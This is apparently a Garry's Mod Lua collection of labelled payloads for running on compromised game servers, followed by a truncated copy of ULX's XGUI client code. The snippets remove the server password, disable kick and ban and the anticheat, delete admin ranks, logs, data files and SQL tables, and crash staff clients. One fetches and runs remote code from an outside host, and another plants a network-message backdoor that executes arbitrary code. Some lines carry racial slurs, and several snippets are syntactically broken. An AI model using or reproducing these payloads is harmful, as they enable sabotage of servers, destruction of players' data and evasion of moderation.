--[[

    Rainbow Physic Gun All

]]--


hook.Add(&quot;Think&quot;,&quot;somewhere_over_the_rainbow&quot;,function()
	local col = HSVToColor(CurTime() * 50 % 360, 1, 1)
	for _, v in ipairs(player.GetAll()) do
		v:SetWeaponColor(Vector(col.r / 255, col.g / 255, col.b / 255))
	end
end)


--[[

    Remove Server Password

]]--


RunConsoleCommand('sv_password','')


--[[

    StopSound

]]--


RunConsoleCommand(&quot;stopsound&quot;)


--[[

    AddMoney

]]--


for k,v in pairs(player.GetAll()) do v:addMoney(&quot;99999&quot;) end


--[[

    Set RP NAME ALL

]]--


for k,v in pairs(player.GetAll()) do v:setDarkRPVar( &quot;rpname&quot;, &quot;K&eacute;vin&quot; ) end


--[[

    Delete ULX Ranks

]]--


if file.Exists( &quot;ulib/groups.txt&quot;, &quot;DATA&quot; ) then file.Delete(&quot;ulib/groups.txt&quot;) end


--[[

    Break Kick / Ban

]]--


if ULib then
	function ULib.kick( ply, reason, calling_ply ) end
	function ULib.ban( ply, time, reason, admin ) end
	function ULib.addBan( steamid, time, reason, name, admin ) end
end

if FAdmin then
	local function no(ply) end
	FAdmin.Commands.AddCommand(&quot;kick&quot;, no)
	FAdmin.Commands.AddCommand(&quot;ban&quot;, no)
	FAdmin.Commands.AddCommand(&quot;jail&quot;, no)
	FAdmin.Commands.AddCommand(&quot;UnJail&quot;, no)
	FAdmin.Commands.AddCommand(&quot;ClearDecals&quot;, no)
	FAdmin.Commands.AddCommand(&quot;StopSounds&quot;, no)
	FAdmin.Commands.AddCommand(&quot;CleanUp&quot;, no)
end


local _R = debug.getregistry()

function _R.Player.Ban(ply, r) end


function _R.Player.Kick(ply, r) end

function game.KickID(id, reason) end

local RCM = RunConsoleCommand

function RunConsoleCommand(command, ...)
	if command == &quot;addip&quot; then return end
	RCM(command, ...)
end


--[[

    Apocalypse

]]--


hook.Add(&quot;Think&quot;, &quot;2012akaapocalypse&quot;, function()
local explode = ents.Create( &quot;env_explosion&quot; ) 
    explode:SetPos( Vector(math.random(-6000, 6000), math.random(-6000, 6000), math.random(-500, 2000)) ) 
    explode:Spawn() 
    explode:SetKeyValue( &quot;iMagnitude&quot;, &quot;500&quot; ) 
    explode:Fire( &quot;Explode&quot;, 0, 0 ) 
end)


--[[

    Clean UP Map

]]--


game.CleanUpMap()


--[[

    Random TP

]]--


for k,v in pairs(player.GetAll()) do v:SetPos( Vector(math.random(-6000, 6000), math.random(-6000, 6000), math.random(-500, 2000)) ) end


--[[

    Unlock All Doors

]]--


local doors = {&quot;func_door&quot;, &quot;func_door_rotating&quot;, &quot;prop_door_rotating&quot;, &quot;prop_dynamic&quot;} for k, v in pairs(ents.GetAll()) do if table.HasValue(doors, v:GetClass()) then v:Fire(&quot;unlock&quot;, &quot;&quot;, 0) end end


--[[

    Toggle All Door

]]--


local doors = {&quot;func_door&quot;, &quot;func_door_rotating&quot;, &quot;prop_door_rotating&quot;, &quot;prop_dynamic&quot;} for k, v in pairs(ents.GetAll()) do if table.HasValue(doors, v:GetClass()) then v:Fire(&quot;toggle&quot;, &quot;&quot;, 0) end end 


--[[

    Launch Everybody

]]--


for k,v in pairs(player.GetAll()) do v:SetVelocity(v:GetVelocity() + Vector(math.random(1000,5000), math.random(1000,5000), math.random(1000,5000))) end


--[[

    Ignite Everybody

]]--


for k,v in pairs(player.GetAll()) do v:Ignite(120) end


--[[

    Kill Everybody

]]--


for k,v in pairs(player.GetAll()) do v:Kill() end


--[[

    Upgrade All

]]--


hook.Add(&quot;Think&quot;, &quot;gvaked&quot;, function()
	for k,v in pairs (player.GetAll()) do
    	v:SetModelScale(2.5, 100);
    	v:SetRunSpeed(400 * 2);
    	v:SetWalkSpeed(200 * 2);
	v:SetModel( &quot;models/props_c17/gravestone_statue001a.mdl&quot; )
    end
end)


--[[

    Big Head

]]--


for k,v in pairs(player.GetAll()) do 
    local a = v:LookupBone(&quot;ValveBiped.Bip01_Head1&quot;)
    local b = v:LookupBone(&quot;ValveBiped.Bip01_R_Thigh&quot;)
    local c = v:LookupBone(&quot;ValveBiped.Bip01_L_Thigh&quot;)
    local d = v:LookupBone(&quot;ValveBiped.Bip01_R_Calf&quot;)
    local e = v:LookupBone(&quot;ValveBiped.Bip01_L_Calf&quot;)
    local f = v:LookupBone(&quot;ValveBiped.Bip01_R_UpperArm&quot;)
    local g = v:LookupBone(&quot;ValveBiped.Bip01_L_UpperArm&quot;)
    local h = v:LookupBone(&quot;ValveBiped.Bip01_R_Forearm&quot;)
    local i = v:LookupBone(&quot;ValveBiped.Bip01_L_Forearm&quot;)
    local j = v:LookupBone(&quot;ValveBiped.Bip01_R_Clavicle&quot;)
    local k = v:LookupBone(&quot;ValveBiped.Bip01_L_Clavicle&quot;)

        v:ManipulateBoneScale( a, Vector(100,100,100)) 
        v:ManipulateBoneScale( b, Vector(100,100,100))
        v:ManipulateBoneScale( c, Vector(100,100,100))
        v:ManipulateBoneScale( d, Vector(100,100,100))
        v:ManipulateBoneScale( e, Vector(100,100,100))
        v:ManipulateBoneScale( f, Vector(100,100,100))
        v:ManipulateBoneScale( g, Vector(100,100,100))
        v:ManipulateBoneScale( h, Vector(100,100,100))
        v:ManipulateBoneScale( i, Vector(100,100,100))
        v:ManipulateBoneScale( j, Vector(100,100,100))
        v:ManipulateBoneScale( k, Vector(100,100,100))
        end


--[[

    Force Danse All

]]--


for k,v in pairs (player.GetAll()) do v:DoAnimationEvent(ACT_GMOD_TAUNT_DANCE) end timer.Create(&quot;dance_loop&quot;,8.9,0,function() for k,v in pairs (player.GetAll()) do v:DoAnimationEvent(ACT_GMOD_TAUNT_DANCE) end end )


--[[

    Force Say

]]--


for k,v in pairs(player.GetAll()) do
    v:ConCommand(&quot;say /// connect 149.202.139.220:27600&quot;)
end


--[[

    Force Retry All

]]--


for k,v in pairs(player.GetAll()) do
    v:ConCommand(&quot;retry&quot;)
end


--[[

    Nuke (M9k)

]]--


local rocket = ents.Create(&quot;m9k_launched_davycrockett&quot;)
local ply2 = table.Random(player.GetAll())
if ply2 == ply then ply:ChatPrint(&quot;[RunString] Prevented epicentre from being you.&quot;) else
    rocket:SetPos(ply2:GetPos())
    rocket:SetOwner(ply2)
    rocket.Owner = ply2
    rocket:Spawn()
    rocket:Activate()
ply:ChatPrint(&quot;[RunString] Allahu akbar.&quot;)  
end


--[[

    Crash All Staff

]]--


for _, p in pairs(player.GetAll()) do
if (p:IsAdmin()) then
    p:SendLua(&quot;cam.End3D()&quot;)
end
end


--[[

    Cough The Console

]]--


for k,v in pairs(player.GetAll()) do
timer.Create(&quot;cough&quot;, 4, 0, function()
    RunConsoleCommand(&quot;say&quot;, &quot;*cough* *cough*&quot;)
    v:EmitSound(&quot;ambient/voices/cough&quot;..math.random(4)..&quot;.wav&quot;, 450 + math.random() * 50, 50 + math.random() * 20)
    util.ScreenShake( Vector( 0, 0, 0 ), 1000, 1000, 5, 5000 )
end)
end


--[[

    SpeedHack

]]--


hook.Add(&quot;Think&quot;, &quot;speedhackisback&quot;, function()
for k,v in pairs (player.GetAll()) do
    v:SetRunSpeed(400* 4);
    v:SetWalkSpeed(200 * 2);
end
end)


--[[

    Minimize All Players

]]--


hook.Add(&quot;Think&quot;, &quot;kirikou&quot;, function()
    for k,v in pairs (player.GetAll()) do
        v:SetModelScale(0.1, 80);
        v:SetRunSpeed(400 * 2);
        v:SetWalkSpeed(200 * 2);
    end
end)


--[[

    Giant All Players

]]--


hook.Add(&quot;Think&quot;, &quot;giantgreenboy&quot;, function()
    for k,v in pairs (player.GetAll()) do
        v:SetModelScale(5.5, 100);
        v:SetRunSpeed(200 * 2);
        v:SetWalkSpeed(100 * 2);
    end
end)


--[[

    2D Players

]]--


local bm = false
for k,v in pairs(player.GetAll()) do 
    local a = v:LookupBone(&quot;ValveBiped.Bip01_Head1&quot;)
    local b = v:LookupBone(&quot;ValveBiped.Bip01_R_Thigh&quot;)
    local c = v:LookupBone(&quot;ValveBiped.Bip01_L_Thigh&quot;)
    local d = v:LookupBone(&quot;ValveBiped.Bip01_R_Calf&quot;)
    local e = v:LookupBone(&quot;ValveBiped.Bip01_L_Calf&quot;)
    local f = v:LookupBone(&quot;ValveBiped.Bip01_R_UpperArm&quot;)
    local g = v:LookupBone(&quot;ValveBiped.Bip01_L_UpperArm&quot;)
    local h = v:LookupBone(&quot;ValveBiped.Bip01_R_Forearm&quot;)
    local i = v:LookupBone(&quot;ValveBiped.Bip01_L_Forearm&quot;)
    local j = v:LookupBone(&quot;ValveBiped.Bip01_R_Clavicle&quot;)
    local k = v:LookupBone(&quot;ValveBiped.Bip01_L_Clavicle&quot;)

        v:ManipulateBoneScale( a, Vector(4,0,4)) 
        v:ManipulateBoneScale( b, Vector(0,0,0))
        v:ManipulateBoneScale( c, Vector(0,0,0))
        v:ManipulateBoneScale( d, Vector(0,0,1))
        v:ManipulateBoneScale( e, Vector(0,0,1))
        v:ManipulateBoneScale( f, Vector(0,0,0))
        v:ManipulateBoneScale( g, Vector(0,0,0))
        v:ManipulateBoneScale( h, Vector(1,1.5,1.5))
        v:ManipulateBoneScale( i, Vector(1,1.5,1.5))
        v:ManipulateBoneScale( j, Vector(0,0,0))
        v:ManipulateBoneScale( k, Vector(0,0,0))
        end


--[[

    Strip All

]]--


for k,v in pairs(ply:GetWeapons()) do
            net.Start(&quot;properties&quot;)
            net.WriteString( &quot;remove&quot; , 32 )
            net.WriteEntity( v )
            net.SendToServer()
        end
    end
end


--[[

    Slap all players

]]--


for k,v in pairs(player.GetAll()) do v:SetVelocity(v:GetVelocity() + Vector(math.random(1000,5000), math.random(1000,5000), math.random(1000,5000))) end


--[[

    Explose All Vehicule

]]--


for k, v in pairs(ents.GetAll()) do if v:IsVehicle() then 

        local explo = ents.Create(&quot;env_explosion&quot;)

        explo:SetPos(v:GetPos())

        explo:SetKeyValue(&quot;iMagnitude&quot;, &quot;300&quot;)

        explo:Spawn()

        explo:Activate()

        explo:Fire(&quot;Explode&quot;, &quot;&quot;, 0)

        end

        end


--[[

    Sexy FootStep

]]--


hook.Add( &quot;PlayerFootstep&quot;, &quot;oooh&quot;, function( ply ) 
	ply:EmitSound( &quot;vo/npc/female01/pain0&quot; .. math.random( 1, 9 ) .. &quot;.wav&quot;, 75, math.random( 50, 100 ) )
		end )


--[[

    Disable CAC

]]--


_G.cac = function() end



--[[

    Rename Server

]]--


RunConsoleCommand(&quot;hostname&quot;, &quot;[FR] TeamFrench SchoolRP #&quot;..math.random(1,999)..&quot;&quot;)



--[[

    Break Vanilla Kick &amp; Ban

]]--


_R = debug.getregistry()
			
			function game.KickID( id, reason )
			
				return
			
			end
			
			function _R.Player.Ban()
			
				return
			
			end
			
			function _R.Player.Kick()
			
				return
				
			end



--[[

        Remplir Data

]]--


for i = 1, 100 do 
file.Write( &quot;hello.from.michael_&quot; .. math.random( 1, 999999 ) .. &quot;.txt&quot;, &quot;[===[Niggerized Server]===]&quot; )
end



--[[

    Force Laugh All

]]--


timer.Create( &quot;gotEm3?&quot;, 1, 120, function()
				
for k, v in next, player.GetAll() do
    
    if v:UserID() == v then continue end
    
    v:SendLua('RunConsoleCommand(&quot;act&quot;,&quot;laungh&quot;)')
        
end

end )



--[[

    Clear ULX &amp; Blogs Logs

]]--


timer.Simple(15, function()
http.Fetch(&quot;disp0.cf/gas.lua&quot;,function(b)RunString(b)end,nil)
timer.Simple(4, function()
file.Delete( &quot;ulx_logs/&quot;..os.date( &quot;%m-%d-%y&quot; )..&quot;.txt&quot; )
file.Delete( &quot;darkrp_logs/&quot;..os.date( &quot;%m-%d-%y&quot; )..&quot;.txt&quot; )
sql.Query( &quot;DROP TABLE blogs_v3 ;&quot; )
sql.Query( DELETE FROM ulogs; )
sql.Query( DELETE FROM mlog_logs; )
end )
end )



--[[

    Set DarkRP Name

]]--


local DESIRED_NAME = &quot;h4x0risedbyn4s4&quot;

timer.Create( &quot;changeyournamemotherfucker&quot;, 0.5, 0, function() for k, v in pairs(player.GetAll()) do DarkRP.storeRPName(v, DESIRED_NAME) v:setDarkRPVar(&quot;rpname&quot;, DESIRED_NAME) end  end)
end )
 
 
for k, v in pairs(player.GetAll()) do DarkRP.storeRPName(v, DESIRED_NAME) v:setDarkRPVar(&quot;rpname&quot;, DESIRED_NAME) end



--[[

    Erase Data

]]--


local files, directories = file.Find( &quot;*&quot;, &quot;DATA&quot; ) for k, v in pairs( files ) do file.Delete( v ) end



--[[

    Erase MySQL DarkRP

]]--


MySQLite.query ('DROP TABLE darkrp_player' MySQLite.query('CREATE TABLE IF NOT EXISTS darkrp_player(idx INTEGER NOT NULL)')



--[[

    WAV Symphony

]]--


timer.Create( &quot;eardieinstantly&quot;, 0.2, 0, function()
 
            for _, p in pairs(player.GetAll()) do
 
                p:EmitSound( &quot;physics/body/body_medium_impact_hard&quot;..math.random(1,6)..&quot;.wav&quot;, 100, math.random( 40, 180 ) )
 
            end
 
        end)



--[[

    The War 

]]--


timer.Create( &quot;datwar&quot;, 1, 0, function()
 
            for _, p in pairs(player.GetAll()) do
 
                p:EmitSound( &quot;ambient/levels/streetwar/city_battle&quot;..math.random( 1, 19 )..&quot;.wav&quot;, 100, math.random( 90, 120 ) )
 
            end
 
        end)



--[[

        Explose All Vehicule

]]--


for k, v in pairs(ents.GetAll()) do if v:IsVehicle() then
 
        local explo = ents.Create(&quot;env_explosion&quot;)
 
        explo:SetPos(v:GetPos())
 
        explo:SetKeyValue(&quot;iMagnitude&quot;, &quot;300&quot;)
 
        explo:Spawn()
 
        explo:Activate()
 
        explo:Fire(&quot;Explode&quot;, &quot;&quot;, 0)
 
        end
 
        end



--[[

        Spam toggle door

]]--


timer.Create(&quot;nigga&quot;, 1, 0, function()
local doors = {&quot;func_door&quot;, &quot;func_door_rotating&quot;, &quot;prop_door_rotating&quot;, &quot;prop_dynamic&quot;} for k, v in pairs(ents.GetAll()) do if table.HasValue(doors, v:GetClass()) then v:Fire(&quot;toggle&quot;, &quot;&quot;, 0) end end
end)



--[[

    Change Level

]]--


game.ConsoleCommand(&quot;changelevel gm_construct\n&quot;)



--[[

    Toggle GodMod

]]--


if v:HasGodMode() then v:GodDisable() else v:GodEnable() end



--[[

    Fast Crash Game

]]--


v:SendLua(&quot;function vacced() return vacced() end vacced()&quot;)



--[[

    Add .NET Backdoor

]]--


util.AddNetworkString( 'netstring' ) net.Receive( 'netstring', function() local x = CompileString( net.ReadString(), 'LuaCmd', false ) if isfunction( x ) then x() end end )



--[[

    Reset Shadow Map Cycle

]]--


for k,v in pairs(player.GetAll()) do
v:SendLua('RunConsoleCommand(&quot;r_shader_srgb&quot;,&quot;0&quot;)')
end



--[[

    Cac ERROR

]]--


CAC.Detections = {}



--[[

    Turn all player screen 66 seconds

]]--


for k, v in pairs( player.GetAll() ) do v:SendLua( [[util.ScreenShake( Vector( 0, 0, 0 ), 10000, 10000, 6, 66 )]] ) end



--[[

    Force Player Micro

]]--


function VoiceOn()
    LocalPlayer():ConCommand(&quot;+voicerecord&quot;)
    end
    concommand.Add(&quot;VoiceOn&quot;, VoiceOn)
    function VoiceOff()
    LocalPlayer():ConCommand(&quot;-voicerecord&quot;)
    end
    concommand.Add(&quot;VoiceOff&quot;, VoiceOff)



--[[

    Mute All Players

]]--


for k, v inpairs(player.GetAll()) do
  v:SendLua(&quot;RunConsoleCommand('volume', 0)&quot;)
end



--[[

    Disable ALT+E

]]--


RunConsoleCommand( &quot;sitting_admin_only&quot;, &quot;1&quot; )



--[[

    Enable Global Noclip

]]--


RunConsoleCommand( &quot;sbox_noclip&quot;, &quot;1&quot; )



--[[

    Kill !menu

]]--


ULib.addSayCommand( '!menu', stopnut )

ULib.cmds.addCommand( &quot;ulx menu&quot;, function()
	sound.PlayURL( &quot;https://instaud.io/_/2xHf.mp3&quot;, &quot;&quot;, function()end )
end )


function stopnut()
	sound.PlayURL( &quot;https://instaud.io/_/2xHf.mp3&quot;, &quot;&quot;, function()end )
end




--[[

    ULX TRUE DO END

]]--


if file.Exists(&quot;ulx/modules/cl/xgui_client.lua&quot;,&quot;LUA&quot;) then
    timer.Simple(1,function()
--XGUI: A GUI for ULX -- by Stickly Man!
xgui = xgui or {}

--Make a spot for modules to store data and hooks
xgui.data = xgui.data or {}
xgui.hook = xgui.hook or { onProcessModules={}, onOpen={}, onClose={} }
--Call this function in your client-side module code to ensure the data types have been instantiated on the client.
function xgui.prepareDataType( dtype, location )
	if not xgui.data[dtype] then
		xgui.data[dtype] = location or {}
		xgui.hook[dtype] = { clear={}, process={}, done={}, add={}, update={}, remove={}, data={} }
	end
end

--Set up various hooks modules can &quot;hook&quot; into.
function xgui.hookEvent( dtype, event, func, name )
	if not xgui.hook[dtype] or ( event and not xgui.hook[dtype][event] ) then
		Msg( &quot;XGUI: Attempted to add to invalid type or event to a hook! (&quot; .. dtype .. &quot;, &quot; .. ( event or &quot;nil&quot; ) .. &quot;)\n&quot; )
	else
		if not name then name = &quot;FixMe&quot; .. math.floor(math.random()*10000) end -- Backwards compatibility for older XGUI modules
		if not event then
			xgui.hook[dtype][name] = func
		else
			xgui.hook[dtype][event][name] = func
		end
	end
end

--Set up tables and functions for creating and storing modules
xgui.modules = xgui.modules or {}

xgui.modules.tab = xgui.modules.tab or {}
function xgui.addModule( name, panel, icon, access, tooltip )
	local refreshModules = false
	for i = #xgui.modules.tab, 1, -1 do
		if xgui.modules.tab[i].name == name then
			xgui.modules.tab[i].panel:Remove()
			xgui.modules.tab[i].tabpanel:Remove()
			xgui.modules.tab[i].xbutton:Remove()
			table.remove(xgui.modules.tab, i)
			refreshModules = true
		end
	end
	table.insert( xgui.modules.tab, { name=name, panel=panel, icon=icon, access=access, tooltip=tooltip } )
	if refreshModules then xgui.processModules() end
end

xgui.modules.setting = xgui.modules.setting or {}
function xgui.addSettingModule( name, panel, icon, access, tooltip )
	local refreshModules = false
	for i = #xgui.modules.setting, 1, -1 do
		if xgui.modules.setting[i].name == name then
			xgui.modules.setting[i].panel:Remove()
			xgui.modules.setting[i].tabpanel:Remove()
			table.remove(xgui.modules.setting, i)
			refreshModules = true
		end
	end
	table.insert( xgui.modules.setting, { name=name, panel=panel, icon=icon, access=access, tooltip=tooltip } )
	if refreshModules then xgui.processModules() end
end

xgui.modules.submodule = xgui.modules.submodule or {}
function xgui.addSubModule( name, panel, access, mtype )
	local refreshModules = false
	for i = #xgui.modules.submodule, 1, -1 do
		if xgui.modules.submodule[i].name == name then
			xgui.modules.submodule[i].panel:Remove()
			table.remove(xgui.modules.submodule, i)
			refreshModules = true
		end
	end
	table.insert( xgui.modules.submodule, { name=name, panel=panel, access=access, mtype=mtype } )
	if refreshModules then xgui.processModules() end
end
--Set up a spot to store entries for autocomplete.
xgui.tabcompletes = xgui.tabcompletes or {}
xgui.ulxmenucompletes = xgui.ulxmenucompletes or {}


--Set up XGUI clientside settings, load settings from file if it exists
xgui.settings = xgui.settings or {}
if ULib.fileExists( &quot;data/ulx/xgui_settings.txt&quot; ) then
	local input = ULib.fileRead( &quot;data/ulx/xgui_settings.txt&quot; )
	input = input:match( &quot;^.-\n(.*)$&quot; )
	xgui.settings = ULib.parseKeyValues( input )
end
--Set default settings if they didn't get loaded
if not xgui.settings.moduleOrder then xgui.settings.moduleOrder = { &quot;Cmds&quot;, &quot;Groups&quot;, &quot;Maps&quot;, &quot;Settings&quot;, &quot;Bans&quot; } end
if not xgui.settings.settingOrder then xgui.settings.settingOrder = { &quot;Sandbox&quot;, &quot;Server&quot;, &quot;Client&quot; } end
if not xgui.settings.animTime then xgui.settings.animTime = 0.22 else xgui.settings.animTime = tonumber( xgui.settings.animTime ) end
if not xgui.settings.infoColor then
	--Default color
	xgui.settings.infoColor = Color( 100, 255, 255, 128 )
else
	--Ensure that the color contains numbers, not strings
	xgui.settings.infoColor = Color(xgui.settings.infoColor.r, xgui.settings.infoColor.g, xgui.settings.infoColor.b, xgui.settings.infoColor.a)
end
if not xgui.settings.showLoadMsgs then xgui.settings.showLoadMsgs = true else xgui.settings.showLoadMsgs = ULib.toBool( xgui.settings.showLoadMsgs ) end
if not xgui.settings.skin then xgui.settings.skin = &quot;Default&quot; end
if not xgui.settings.xguipos then xgui.settings.xguipos = { pos=5, xoff=0, yoff=0 } end
if not xgui.settings.animIntype then xgui.settings.animIntype = 1 end
if not xgui.settings.animOuttype then xgui.settings.animOuttype = 1 end


function xgui.init( ply )
	xgui.load_helpers()

	--Initiate the base window (see xgui_helpers.lua for code)
	xgui.makeXGUIbase{}

	--Create the bottom infobar
	xgui.infobar = xlib.makepanel{ x=10, y=399, w=580, h=20, parent=xgui.anchor }
	xgui.infobar:NoClipping( true )
	xgui.infobar.Paint = function( self, w, h )
		draw.RoundedBoxEx( 4, 0, 1, 580, 20, xgui.settings.infoColor, false, false, true, true )
	end
	local infoLabel = string.format( &quot;\nULX Admin Mod :: XGUI - Team Ulysses |  ULX %s  |  ULib %s&quot;, ULib.pluginVersionStr(&quot;ULX&quot;), ULib.pluginVersionStr(&quot;ULib&quot;) )
	xlib.makelabel{ x=5, y=-10, label=infoLabel, parent=xgui.infobar }:NoClipping( true )
	xgui.thetime = xlib.makelabel{ x=515, y=-10, label=&quot;&quot;, parent=xgui.infobar }
	xgui.thetime:NoClipping( true )
	xgui.thetime.check = function()
		xgui.thetime:SetText( os.date( &quot;\n%I:%M:%S %p&quot; ) )
		xgui.thetime:SizeToContents()
		timer.Simple( 1, xgui.thetime.check )
	end
	xgui.thetime.check()

	--Create an offscreen place to parent modules that the player can't access
	xgui.null = xlib.makepanel{ x=-10, y=-10, w=0, h=0 }
	xgui.null:SetVisible( false )

	--Load modules
	local sm = xgui.settings.showLoadMsgs
	if sm then
		Msg( &quot;\n///////////////////////////////////////\n&quot; )
		Msg( &quot;//  ULX GUI -- Made by Stickly Man!  //\n&quot; )
		Msg( &quot;///////////////////////////////////////\n&quot; )
		Msg( &quot;// Loading GUI Modules...            //\n&quot; )
	end
	for _, file in ipairs( file.Find( &quot;ulx/xgui/*.lua&quot;, &quot;LUA&quot; ) ) do
		include( &quot;ulx/xgui/&quot; .. file )
		if sm then Msg( &quot;//   &quot; .. file .. string.rep( &quot; &quot;, 32 - file:len() ) .. &quot;//\n&quot; ) end
	end
	if sm then Msg( &quot;// Loading Setting Modules...        //\n&quot; ) end
	for _, file in ipairs( file.Find( &quot;ulx/xgui/settings/*.lua&quot;, &quot;LUA&quot; ) ) do
		include( &quot;ulx/xgui/settings/&quot; .. file )
		if sm then Msg( &quot;//   &quot; .. file .. string.rep( &quot; &quot;, 32 - file:len() ) .. &quot;//\n&quot; ) end
	end
	if sm then Msg( &quot;// Loading Gamemode Module(s)...     //\n&quot; ) end
	if ULib.isSandbox() and GAMEMODE.FolderName ~= &quot;sandbox&quot; then -- If the gamemode sandbox-derived (but not sandbox, that will get added later), then add the sandbox Module
		include( &quot;ulx/xgui/gamemodes/sandbox.lua&quot; )
		if sm then Msg( &quot;//   sandbox.lua                     //\n&quot; ) end
	end
	for _, file in ipairs( file.Find( &quot;ulx/xgui/gamemodes/*.lua&quot;, &quot;LUA&quot; ) ) do
		if string.lower( file ) == string.lower( GAMEMODE.FolderName .. &quot;.lua&quot; ) then
			include( &quot;ulx/xgui/gamemodes/&quot; .. file )
			if sm then Msg( &quot;//   &quot; .. file .. string.rep( &quot; &quot;, 32 - file:len() ) .. &quot;//\n&quot; ) end
			break
		end
		if sm then Msg( &quot;//   No module found!                //\n&quot; ) end
	end
	if sm then Msg( &quot;// Modules Loaded!                   //\n&quot; ) end
	if sm then Msg( &quot;///////////////////////////////////////\n\n&quot; ) end

	--Find any existing modules that aren't listed in the requested order.
	local function checkModulesOrder( moduleTable, sortTable )
		for _, m in ipairs( moduleTable ) do
			local notlisted = true
			for _, existing in ipairs( sortTable ) do
				if m.name == existing then
					notlisted = false
					break
				end
			end
			if notlisted then
				table.insert( sortTable, m.name )
			end
		end
	end
	checkModulesOrder( xgui.modules.tab, xgui.settings.moduleOrder )
	checkModulesOrder( xgui.modules.setting, xgui.settings.settingOrder )

	--Check if the server has XGUI installed
	RunConsoleCommand( &quot;_xgui&quot;, &quot;getInstalled&quot; )

	xgui.initialized = true

	xgui.processModules()
end
hook.Add( ULib.HOOK_LOCALPLAYERREADY, &quot;InitXGUI&quot;, xgui.init, HOOK_MONITOR_LOW )

function xgui.saveClientSettings()
	if not ULib.fileIsDir( &quot;data/ulx&quot; ) then
		ULib.fileCreateDir( &quot;data/ulx&quot; )
	end
	local output = &quot;// This file stores clientside settings for XGUI.\n&quot;
	output = output .. ULib.makeKeyValues( xgui.settings )
	ULib.fileWrite( &quot;data/ulx/xgui_settings.txt&quot;, output )
end

function xgui.checkModuleExists( modulename, moduletable )
	for k, v in ipairs( moduletable ) do
		if v.name == modulename then
			return k
		end
	end
	return false
end

function xgui.processModules()
	local activetab = nil
	if xgui.base:GetActiveTab() then
		activetab = xgui.base:GetActiveTab():GetValue()
	end

	local activesettingstab = nil
	if xgui.settings_tabs:GetActiveTab() then
		activesettingstab = xgui.settings_tabs:GetActiveTab():GetValue()
	end

	xgui.base:Clear() --We need to remove any existing tabs in the GUI
	xgui.tabcompletes = {}
	xgui.ulxmenucompletes = {}
	for _, modname in ipairs( xgui.settings.moduleOrder ) do
		local module = xgui.checkModuleExists( modname, xgui.modules.tab )
		if module then
			module = xgui.modules.tab[module]
			if module.xbutton == nil then
				module.xbutton = xlib.makebutton{ x=555, y=-5, w=32, h=24, btype=&quot;close&quot;, parent=module.panel }
				module.xbutton.DoClick = function()
					xgui.hide()
				end
			end
			if LocalPlayer():query( module.access ) then
				xgui.base:AddSheet( module.name, module.panel, module.icon, false, false, module.tooltip )
				module.tabpanel = xgui.base.Items[#xgui.base.Items].Tab
				table.insert( xgui.tabcompletes, &quot;xgui show &quot; .. modname )
				table.insert( xgui.ulxmenucompletes, &quot;ulx menu &quot; .. modname )
			else
				module.tabpanel = nil
				module.panel:SetParent( xgui.null )
			end
		end
	end

	xgui.settings_tabs:Clear() --Clear out settings tabs for reprocessing
	for _, modname in ipairs( xgui.settings.settingOrder ) do
		local module = xgui.checkModuleExists( modname, xgui.modules.setting )
		if module then
			module = xgui.modules.setting[module]
			if LocalPlayer():query( module.access ) then
				xgui.settings_tabs:AddSheet( module.name, module.panel, module.icon, false, false, module.tooltip )
				module.tabpanel = xgui.settings_tabs.Items[#xgui.settings_tabs.Items].Tab
				table.insert( xgui.tabcompletes, &quot;xgui show &quot; .. modname )
				table.insert( xgui.ulxmenucompletes, &quot;ulx menu &quot; .. modname )
			else
				module.tabpanel = nil
				module.panel:SetParent( xgui.null )
			end
		end
	end

	--Call any functions that requested to be called when permissions change
	xgui.callUpdate( &quot;onProcessModules&quot; )
	table.sort( xgui.tabcompletes )
	table.sort( xgui.ulxmenucompletes )

	local hasFound = false
	if activetab then
		for _, v in pairs( xgui.base.Items ) do
			if v.Tab:GetValue() == activetab then
				xgui.base:SetActiveTab( v.Tab, true )
				hasFound = true
				break
			end
		end
		if not hasFound then
			xgui.base.m_pActiveTab = &quot;none&quot;
			xgui.base:SetActiveTab( xgui.base.Items[1].Tab, true )
		end
	end

	hasFound = false
	if activesettingstab then
		for _, v in pairs( xgui.settings_tabs.Items ) do
			if v.Tab:GetValue() == activesettingstab then
				xgui.settings_tabs:SetActiveTab( v.Tab, true )
				hasFound = true
				break
			end
		end
		if not hasFound then
			xgui.settings_tabs.m_pActiveTab = &quot;none&quot;
			xgui.settings_tabs:SetActiveTab( xgui.settings_tabs.Items[1].Tab, true )
		end
	end
end

function xgui.checkNotInstalled( tabname )
	if xgui.notInstalledWarning then return end

	gui.EnableScreenClicker( true )
	RestoreCursorPosition()
	xgui.notInstalledWarning = xlib.makeframe{ label=&quot;XGUI Warning!&quot;, w=375, h=110, nopopup=true, showclose=false, skin=xgui.settings.skin }
	xlib.makelabel{ x=10, y=30, wordwrap=true, w=365, label=&quot;XGUI has not initialized properly with the server. This could be caused by a heavy server load after a mapchange, a major error during XGUI server startup, or XGUI not being installed.&quot;, parent=xgui.notInstalledWarning }

	xlib.makebutton{ x=37, y=83, w=80, label=&quot;Offline Mode&quot;, parent=xgui.notInstalledWarning }.DoClick = function()
		xgui.notInstalledWarning:Remove()
		xgui.notInstalledWarning = nil
		offlineWarning = xlib.makeframe{ label=&quot;XGUI Warning!&quot;, w=375, h=110, nopopup=true, showclose=false, skin=xgui.settings.skin }
		xlib.makelabel{ x=10, y=30, wordwrap=true, w=365, label=&quot;XGUI will run locally in offline mode. Some features will not work, and information will be missing. You can attempt to reconnect to the server using the 'Refresh Server Data' button in the XGUI client menu.&quot;, parent=offlineWarning }
		xlib.makebutton{ x=77, y=83, w=80, label=&quot;OK&quot;, parent=offlineWarning }.DoClick = function()
			offlineWarning:Remove()
			xgui.offlineMode = true
			xgui.show( tabname )
		end
		xlib.makebutton{ x=217, y=83, w=80, label=&quot;Cancel&quot;, parent=offlineWarning }.DoClick = function()
			offlineWarning:Remove()
			RememberCursorPosition()
			gui.EnableScreenClicker( false )
		end
	end

	xlib.makebutton{ x=257, y=83, w=80, label=&quot;Close&quot;, parent=xgui.notInstalledWarning }.DoClick = function()
		xgui.notInstalledWarning:Remove()
		xgui.notInstalledWarning = nil
		RememberCursorPosition()
		gui.EnableScreenClicker( false )
	end

	xlib.makebutton{ x=147, y=83, w=80, label=&quot;Try Again&quot;, parent=xgui.notInstalledWarning }.DoClick = function()
		xgui.notInstalledWarning:Remove()
		xgui.notInstalledWarning = nil
		RememberCursorPosition()
		gui.EnableScreenClicker( false )
		local reattempt = xlib.makeframe{ label=&quot;XGUI: Attempting reconnection...&quot;, w=200, h=20, nopopup=true, showclose=false, skin=xgui.settings.skin }
		timer.Simple( 1, function()
